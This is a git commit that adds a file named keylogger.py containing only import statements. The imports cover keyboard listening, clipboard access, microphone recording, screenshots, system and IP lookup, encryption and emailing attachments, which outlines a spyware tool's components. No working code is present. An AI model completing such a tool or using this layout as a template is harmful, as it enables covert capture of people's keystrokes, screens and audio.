f1b3b4d89e4232faa0f8a7c0646d20d83d36ea5a
RachitTanwar <tanwarrachit6@gmail.com>
2024-06-28 18:15:21 +0530

    Libraries Imported

---
+++ project/keylogger.py
@@ -0,0 +1,28 @@
+# Libraries
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import pyperclip
+
+from pynput.keyboard import Key, Listener
+
+import time
+import os
+
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet
+
+import getpass
+from requests import get
+
+from multiprocessing import freeze_support, Process
+from PIL import ImageGrab
